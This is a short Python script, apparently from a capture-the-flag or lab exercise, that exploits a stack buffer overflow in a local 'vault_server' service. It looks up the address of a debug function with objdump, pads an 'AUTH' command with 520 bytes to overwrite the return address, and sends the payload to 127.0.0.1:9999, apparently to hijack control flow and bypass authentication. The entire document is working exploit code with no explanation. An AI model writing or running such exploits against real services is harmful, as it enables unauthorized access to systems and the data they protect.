import socket, struct, os
DEBUG_ADDR = int(os.popen("objdump -t src/vault_server | grep debug_offset | awk '{print $1}'").read().strip(), 16)
payload = b"AUTH " + (b"A" * 520) + struct.pack('<Q', DEBUG_ADDR)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9999))
s.recv(1024)
s.send(payload)
s.close()
